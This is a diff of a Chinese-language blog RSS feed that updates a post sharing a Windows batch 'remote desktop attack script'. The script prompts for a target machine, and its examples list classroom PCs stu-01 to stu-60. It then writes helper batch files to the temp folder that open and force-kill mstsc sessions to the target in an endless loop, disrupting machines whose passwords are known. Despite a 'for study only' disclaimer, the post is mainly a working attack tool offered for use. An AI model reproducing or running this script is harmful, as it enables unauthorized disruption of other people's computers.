@@ -12,7 +12,7 @@
 	<atom:link href="https://sodih3iw.github.io/index.php/author/sodih3iw/feed/" rel="self" type="application/rss+xml" />
 	<link>https://sodih3iw.github.io/</link>
 	<description>让我们学些东西……</description>
-	<lastBuildDate>Sat, 14 Jun 2025 06:35:39 +0000</lastBuildDate>
+	<lastBuildDate>Tue, 17 Jun 2025 05:31:27 +0000</lastBuildDate>
 	<language>zh-Hans</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -55,7 +55,7 @@
 
 
 
-<div class="wp-block-file"><a id="wp-block-file--media-c4cb77b2-122b-4c45-8347-96fb23b856e5" href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip">main</a><a href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip" class="wp-block-file__button wp-element-button" download aria-describedby="wp-block-file--media-c4cb77b2-122b-4c45-8347-96fb23b856e5">下载</a></div>
+<div class="wp-block-file"><a id="wp-block-file--media-6dee8fc2-a072-4ac7-acec-2f5229627c4f" href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip">main</a><a href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip" class="wp-block-file__button wp-element-button" download aria-describedby="wp-block-file--media-6dee8fc2-a072-4ac7-acec-2f5229627c4f">下载</a></div>
 
 
 
@@ -66,57 +66,116 @@
 <pre class="wp-block-code"><code>@echo off
 color f0
 title 朱佳乐深沉地爱着你 远程桌面攻击脚本
+
+:main
 echo 作者：朱佳乐深沉地爱着你
 echo 本脚本使用远程桌面攻击已知密码的计算机
 echo 注意：本脚本仅供交流学习，禁止使用本脚本进行恶作剧
 echo 注意：本脚本运行时不能打开远程桌面，本脚本不能同时运行多个
+
+:: 询问信息
 echo.
 echo ########################################
-echo 请输入靶机的“计算机名称”或“IP地址”，不区分大小写
-echo 例如：room-stu-01  student-13-win7  teacher-57  192.168.100.98
+echo 计算机名称或IP地址示例，不区分大小写
+echo 输入值示例：stu-01  student-13-win7  teacher-57  192.168.100.98
+echo 实际环境示例：
+echo stu-51 stu-52 stu-53 stu-54 stu-55 stu-56 stu-57 stu-58 stu-59 stu-60
+echo stu-41 stu-42 stu-43 stu-44 stu-45 stu-46 stu-47 stu-48 stu-49 stu-50
+echo stu-31 stu-32 stu-33 stu-34 stu-35 stu-36 stu-37 stu-38 stu-39 stu-40
+echo stu-21 stu-22 stu-23 stu-24 stu-25 stu-26 stu-27 stu-28 stu-29 stu-30
+echo stu-11 stu-12 stu-13 stu-14 stu-15 stu-16 stu-17 stu-18 stu-19 stu-20
+echo stu-01 stu-02 stu-03 stu-04 stu-05 stu-06 stu-07 stu-08 stu-09 stu-10
 
 :entername
 set name=000.000.000.000
-set /p name=请输入：
+echo.
+echo 选项：
+echo &#91;不输入]打开资源管理器网络面板
+echo &#91;其他值]输入靶机的计算机名称或IP地址（不区分大小写）
+set /p name=请输入后按下回车键：
 if %name%==000.000.000.000 (
-    echo 输入不能为空！
+    explorer shell:NetworkPlacesFolder
+    echo 资源管理器网络面板已打开
     goto entername
 )
 
+:: 输入攻击间隔时间
 echo.
 echo ########################################
-echo 请输入攻击间隔时间（单位：秒）
-echo 即每次攻击开始到结束的时间，太短可能导致没有连接成功就结束
-echo 例如：5  8（推荐）  10
+echo 请输入攻击间隔时间（单位：秒，数值为正整数）
+echo 即每次连接开始到断开连接的时间，太短可能导致没有连接成功就强制结束
+echo 例如：7  10（推荐）  15
 
-:entertime
+:waittime
 set waittime=0
 set /p waittime=请输入：
-if %waittime%==0 (
-    echo 输入不能为0或空！
-    goto entertime
+if /i %waittime% leq 0 (
+    echo 输入不能为非正数或空！
+    goto waittime
 )
 
-del kill.bat > nul
-echo @echo off > kill.bat
-echo :start >> kill.bat
-echo timeout /t %waittime% >> kill.bat
-echo taskkill /im mstsc.exe /f >> kill.bat
-echo goto start >> kill.bat
-
+:: 测试连接
 echo.
 echo ########################################
 echo 接下来进行测试连接，请注意每个“记住”、“不再”选项都要勾选
 echo 按下任意键测试……
 pause > nul
 mstsc /v %name% /span
-echo 如果测试成功，按下任意键开始……
+
+set option=0
+echo.
+echo 选项：
+echo &#91;1]从头开始以重新设置
+echo &#91;不输入及其他值]开始攻击
+set /p option=请输入后按下回车键：
+if %option%==1 (
+    cls
+    goto main
+)
+
+:: 文件准备
+echo.
+echo ########################################
+echo 所需文件准备中……
+
+:: kill.bat 准备
+echo. > %temp%\kill.bat
+del %temp%\kill.bat
+echo @echo off > %temp%\kill.bat
+echo :start >> %temp%\kill.bat
+echo timeout /t %waittime% >> %temp%\kill.bat
+echo taskkill /im mstsc.exe /f >> %temp%\kill.bat
+echo goto start >> %temp%\kill.bat
+:: mstscstart.bat 准备
+echo. > %temp%\mstscstart.bat
+del %temp%\mstscstart.bat
+echo @echo off > %temp%\mstscstart.bat
+echo :mstscstart >> %temp%\mstscstart.bat
+echo mstsc /v %name% /w:1 /h:1 >> %temp%\mstscstart.bat
+echo goto mstscstart >> %temp%\mstscstart.bat
+
+echo 所需文件准备成功！
+echo 文件位于 %temp% 下
+
+:: 运行所需脚本
+start /min %temp%\kill.bat
+start /min %temp%\mstscstart.bat
+
+echo 攻击已开始！
+
+:: 结束
+echo.
+echo ########################################
+echo 注意：关闭所有操作请按下任意键，切勿私自关闭！
+echo 否则会留下残余文件以及后台进程！
+echo.
+echo 按下任意键结束本次攻击……
 pause > nul
 
-start /min kill.bat
-:start
-mstsc /v %name% /w:1 /h:1
-goto start</code></pre>
+del %temp%\kill.bat
+del %temp%\mstscstart.bat
+taskkill /im mstsc.exe /f
+taskkill /im cmd.exe /f</code></pre>
 ]]></content:encoded>
 					
 					<wfw:commentRss>https://sodih3iw.github.io/index.php/2025/06/14/remote-desktop-attack-scripts/feed/</wfw:commentRss>
